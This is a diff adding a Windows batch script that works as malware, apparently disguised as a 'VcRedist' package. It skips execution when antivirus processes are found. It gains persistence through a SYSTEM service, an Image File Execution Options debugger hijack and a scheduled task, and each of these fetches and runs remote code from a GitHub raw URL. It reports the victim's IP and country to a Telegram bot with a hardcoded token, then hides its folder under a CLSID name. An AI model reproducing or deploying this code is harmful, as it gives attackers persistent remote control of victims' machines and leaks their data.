@@ -1,0 +1,39 @@
+setlocal EnableDelayedExpansion
+if exist "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\" (
+    rd /s /q "%ProgramData%\VcRedist"
+    exit /b
+)
+
+if exist "%ProgramData%\logdata..\Index.exe" (
+    rd /s /q "%ProgramData%\VcRedist"
+    exit /b
+)
+
+set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe"
+
+for %a in (%processList%) do (
+    tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
+    if not errorlevel 1 (
+        rd /s /q "%ProgramData%\VcRedist"
+        exit /b
+    )
+)
+
+sc create Help binPath="cmd.exe /c powershell.exe irm https://raw.githubusercontent.com/pushop/0/0/0/run.ps1 ^| iex" start="auto" obj="LocalSystem"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TiWorker.exe" /v Debugger /t REG_SZ /d "cmd /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/0/ns | cmd /V:ON" /f
+schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc minute /mo 40 /tn "\Windows\Help" /tr "cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/0/ns | cmd /Q /V:ON" /F
+
+chcp 65001 >nul
+set "TOKEN=7567212018:AAEhgS3yGZBLlAEreCWW1Vv3cWsAY3Q_Sew"
+set "CHAT_ID=-4955395962"
+set "IP=No IP"
+set "Country=No Country"
+
+for /f "tokens=1,2 delims=," %a in ('%WINDIR%\System32\curl.exe -s "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
+    if not "%a"=="" set "Country=%a"
+    if not "%b"=="" set "IP=%b"
+)
+
+%WINDIR%\System32\curl.exe -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=NAZAR%0AIP: %IP%%0ACountry: %Country%" 1>nul 2>nul
+rename "%ProgramData%\VcRedist" "LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+endlocal
